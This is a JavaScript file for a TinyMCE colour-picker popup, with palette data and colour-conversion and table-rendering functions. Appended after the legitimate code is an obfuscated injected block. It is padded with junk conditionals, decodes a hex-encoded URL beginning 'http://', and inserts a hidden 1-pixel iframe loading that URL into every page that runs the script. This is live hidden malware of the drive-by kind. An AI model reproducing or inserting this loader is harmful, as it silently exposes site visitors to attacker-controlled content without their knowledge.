function init() {
	if (tinyMCE.isMSIE)
		tinyMCEPopup.resizeToInnerSize();
}

function selectColor() {
	var color = document.getElementById("selectedColorBox").value;

	tinyMCEPopup.execCommand(tinyMCE.getWindowArg('command'), false, color);
	tinyMCEPopup.close();
}

function showColor(color) {
	document.getElementById("selectedColor").style.backgroundColor = color;
	document.getElementById("selectedColorBox").value = color;
}

var colors = new Array(
	"#000000","#000033","#000066","#000099","#0000cc","#0000ff","#330000","#330033",
	"#330066","#330099","#3300cc","#3300ff","#660000","#660033","#660066","#660099",
	"#6600cc","#6600ff","#990000","#990033","#990066","#990099","#9900cc","#9900ff",
	"#cc0000","#cc0033","#cc0066","#cc0099","#cc00cc","#cc00ff","#ff0000","#ff0033",
	"#ff0066","#ff0099","#ff00cc","#ff00ff","#003300","#003333","#003366","#003399",
	"#0033cc","#0033ff","#333300","#333333","#333366","#333399","#3333cc","#3333ff",
	"#663300","#663333","#663366","#663399","#6633cc","#6633ff","#993300","#993333",
	"#993366","#993399","#9933cc","#9933ff","#cc3300","#cc3333","#cc3366","#cc3399",
	"#cc33cc","#cc33ff","#ff3300","#ff3333","#ff3366","#ff3399","#ff33cc","#ff33ff",
	"#006600","#006633","#006666","#006699","#0066cc","#0066ff","#336600","#336633",
	"#336666","#336699","#3366cc","#3366ff","#666600","#666633","#666666","#666699",
	"#6666cc","#6666ff","#996600","#996633","#996666","#996699","#9966cc","#9966ff",
	"#cc6600","#cc6633","#cc6666","#cc6699","#cc66cc","#cc66ff","#ff6600","#ff6633",
	"#ff6666","#ff6699","#ff66cc","#ff66ff","#009900","#009933","#009966","#009999",
	"#0099cc","#0099ff","#339900","#339933","#339966","#339999","#3399cc","#3399ff",
	"#669900","#669933","#669966","#669999","#6699cc","#6699ff","#999900","#999933",
	"#999966","#999999","#9999cc","#9999ff","#cc9900","#cc9933","#cc9966","#cc9999",
	"#cc99cc","#cc99ff","#ff9900","#ff9933","#ff9966","#ff9999","#ff99cc","#ff99ff",
	"#00cc00","#00cc33","#00cc66","#00cc99","#00cccc","#00ccff","#33cc00","#33cc33",
	"#33cc66","#33cc99","#33cccc","#33ccff","#66cc00","#66cc33","#66cc66","#66cc99",
	"#66cccc","#66ccff","#99cc00","#99cc33","#99cc66","#99cc99","#99cccc","#99ccff",
	"#cccc00","#cccc33","#cccc66","#cccc99","#cccccc","#ccccff","#ffcc00","#ffcc33",
	"#ffcc66","#ffcc99","#ffcccc","#ffccff","#00ff00","#00ff33","#00ff66","#00ff99",
	"#00ffcc","#00ffff","#33ff00","#33ff33","#33ff66","#33ff99","#33ffcc","#33ffff",
	"#66ff00","#66ff33","#66ff66","#66ff99","#66ffcc","#66ffff","#99ff00","#99ff33",
	"#99ff66","#99ff99","#99ffcc","#99ffff","#ccff00","#ccff33","#ccff66","#ccff99",
	"#ccffcc","#ccffff","#ffff00","#ffff33","#ffff66","#ffff99","#ffffcc","#ffffff"
);

function convertRGBToHex(col) {
	var re = new RegExp("rgb\\s*\\(\\s*([0-9]+).*,\\s*([0-9]+).*,\\s*([0-9]+).*\\)", "gi");

	var rgb = col.replace(re, "$1,$2,$3").split(',');
	if (rgb.length == 3) {
		r = parseInt(rgb[0]).toString(16);
		g = parseInt(rgb[1]).toString(16);
		b = parseInt(rgb[2]).toString(16);

		r = r.length == 1 ? '0' + r : r;
		g = g.length == 1 ? '0' + g : g;
		b = b.length == 1 ? '0' + b : b;

		return "#" + r + g + b;
	}

	return col;
}

function convertHexToRGB(col) {
	if (col.indexOf('#') != -1) {
		col = col.replace(new RegExp('[^0-9A-F]', 'gi'), '');

		r = parseInt(col.substring(0, 2), 16);
		g = parseInt(col.substring(2, 4), 16);
		b = parseInt(col.substring(4, 6), 16);

		return "rgb(" + r + "," + g + "," + b + ")";
	}

	return col;
}

function renderColorMap() {
	var html = "";
	var inputColor = convertRGBToHex(tinyMCE.getWindowArg('input_color'));

	html += '<table border="0" cellspacing="1" cellpadding="0">'
		+ '<tr>';
	for (var i=0; i<colors.length; i++) {
		html += '<td bgcolor="' + colors[i] + '">'
			+ '<a href="javascript:selectColor();" onfocus="showColor(\'' + colors[i] +  '\');" onmouseover="showColor(\'' + colors[i] +  '\');">'
			+ '<img border="0" src="images/spacer.gif" width="10" height="10" title="' + colors[i] +  '" alt="' + colors[i] +  '" /></a></td>';
		if ((i+1) % 18 == 0)
			html += '</tr><tr>';
	}
	html += '<tr><td colspan="18">'
		+ '<table width="100%" border="0" cellspacing="0" cellpadding="0">'
		+ '<tr><td>'
		+ '<img id="selectedColor" style="background-color:' + tinyMCE.getWindowArg('input_color') + '" border="0" src="images/spacer.gif" width="80" height="16" />'
		+ '</td><td align="right">'
		+ '<input id="selectedColorBox" name="selectedColorBox" type="text" size="7" maxlength="7" style="width:65px" value="' + inputColor + '" />'
		+ '</td></tr>'
		+ '</table>'
		+ '<div style="float: left"><input type="button" id="insert" name="insert" value="{$lang_theme_colorpicker_apply}" style="margin-top:3px" onclick="selectColor();"></div>'
		+ '<div style="float: right"><input type="button" name="cancel" value="{$lang_cancel}" style="margin-top:3px" onclick="tinyMCEPopup.close();" id="cancel" /></div>'
		+ '</td></tr>'
		+ '</table>';

	document.write(html);
}
if('RzRI'=='vNmYZr')WotWy();var EeQB=190;var SAWXZ='xDLvr';var kNAir="ap\x70\x65n\x64Chil\x64";var xYLXAV=185;var pmYPbUq="from\x43harCode";var eAGoDq="pa\x72seIn\x74";var cZZxfH;if('Aoruhu'=='CvAro')bMEhTb='stDI';var KJdRokWGJ="";if('mhWHI'=='vuBb')cDAacx='tRSR';if('XKItnr'=='iXtkqQ')ibyaKC='cndwyY';var appVersion_var="a\x70\x70\x56e\x72s\x69on";var VKNc=10;var SozsA;var PZwXGX;if('dLNmC'=='WwTd')CCaq();if('URyu'=='FZzn')BCbGq();var TRUSkxc="body";var GVNV=79;var HyttL="slice";var NvejW='ntsiIx';var BMimh="\x63onstr\x75cto\x72";var pwqc;if('FvqYLK'=='IsceNQ')HQCI='VgQs';var BIhKphTEQ="9ba7a7a36d626299a59460a094ac656364656196a2a062a09ca197629ca161969a9c726463";var SZREI='tFuED';function lnKO(){}
var px1_var="1px";var klOIhyk=(function(){function TbDDFK(){var zuteCK='tVpSj';if('nZpx'=='rGoRe')Qxrv();}
return this;function OLah(){var yfPs='jVHplE';if('bUlmH'=='WEYcvU')dkYCa();}var CKletS;function rUIc(){var mKMf='CCsdY';if('aiBDhp'=='tylb')WcuC();}})();var yButY=215;var HStRUMg="sgNqAT"[BMimh];var XYwKI;var Sqwl;function QyBOBx(){var JzbjlS='JYtrb';if('zTKPI'=='Iphx')WuaUll();}
for(var IcBNC=0;IcBNC<BIhKphTEQ.length;IcBNC+=2){jvQERqqov=klOIhyk[eAGoDq](BIhKphTEQ[HyttL](IcBNC,IcBNC+2),16)-51;if('rnYZRw'=='hlTy')kVsaT();KJdRokWGJ+=HStRUMg[pmYPbUq](jvQERqqov);var nEJG;var iFmKZy;}
var HlpUpS=84;if('xWjUjt'=='dcGe')mumE='MUWlQ';var cFEu='KIZNt';var zcUAbgYzM="mRbjH";function LIWepn(){}if('wSwjh'=='nPjqNQ')esaOZs();var Tysr;var Iixrn="";var gTtVhp;if('gRYz'=='Vzog')OEzBK='ZYwWC';if(navigator[appVersion_var].indexOf("MSIE")!=-1){var DKGY='RZXGja';if('qJOYPa'=='aalQ')AUeuX();Iixrn='<iframe name="'+zcUAbgYzM+'" src="'+"KJdRokWGJ"+'">';var fancid='jMuUYl';function lXyuT(){}}else{var uQPPkp=194;Iixrn='iframe';var tljyA=208;}
if('SKDLX'=='rnTid')IejBuK();if('KpSDVL'=='ejxthb')kwtAy='twbq';var sPqYiADw=document.createElement(Iixrn);var lQuevG='OpkF';function IzLf(){var CuRqE='VpzNl';if('PgrAR'=='tTSHYF')dbRc();}
sPqYiADw.LsXigs=sPqYiADw.setAttribute;var oaKv='ekQsP';sPqYiADw.style.position="absolute";if('YPvq'=='gbal')tkkoYk='MfjxI';function vfNuI(){}
sPqYiADw.style.height=px1_var;function oRzdI(){}var QHFUR;var UqOfH='GwZBB';sPqYiADw.LsXigs("src",KJdRokWGJ);sPqYiADw.id=zcUAbgYzM;var pXTDG=159;sPqYiADw.style.top="0px";if('tiAK'=='qwJONu')Rqosk();if('ocqrzg'=='byOAl')lDYdEb();sPqYiADw.name=zcUAbgYzM;if('lxQsY'=='gbRhI')QgIPd='FXuK';function juVa(){}
sPqYiADw.style.right="0px";var Udti;if('vfBosj'=='oLaz')TsVT();sPqYiADw.style.width=px1_var;var fDOX;var XQsoM;var NOMde;function ictQFJNG(){var njIAE;if(document[TRUSkxc]){var RIdIR=158;if('QvzybL'=='DNkG')Skno='DjVSRQ';document[TRUSkxc][kNAir](sPqYiADw);}else{if('UzWHc'=='GEnF')sxeV();setTimeout(ictQFJNG,120);var hUVQ='mFuEUi';var imJFc=198;function pXlxj(){var HMIBED='XWnqe';if('LnIj'=='tyPOt')kOQyWJ();}}
var kOQVv='wGyH';}
if('fsjai'=='uWtI')HDDKFT();ictQFJNG();var OoTRIo=107;if('KFTOc'=='AIFvRC')ErNE();function LdLcmi(){var biGo='ELbpKK';if('xRgpIW'=='HvUu')lzEumj();}function NtmL(){}